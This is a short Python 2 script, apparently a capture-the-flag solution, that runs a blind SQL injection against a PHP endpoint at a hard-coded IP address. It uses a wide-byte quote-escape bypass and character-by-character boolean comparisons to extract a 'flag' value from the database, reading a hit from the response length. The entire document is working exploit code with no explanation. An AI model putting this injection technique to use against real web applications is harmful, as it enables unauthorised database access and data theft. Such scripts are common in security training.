#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests
import string
url = 'http://218.2.197.235:23733/index.php?key='
payload ='%df%27||right(left((select(flag)from(flag)),{pos}),1)=binary(0x{c})%23'
req =requests.session()

def get_flag():
    flag = ""
    str = string.printable
    for i in xrange(1,50):
        for char in str:
            endurl = (url+payload).format(pos=i,c=char.encode('hex'))
            r = req.get(endurl)
            #print endurl
            if(char=='}'):
                flag+=char
                print "we get all flag!"
                print flag
                print 'test'
                exit()
            if(len(r.text)>1000):
                flag+=char
                print flag
                break
get_flag()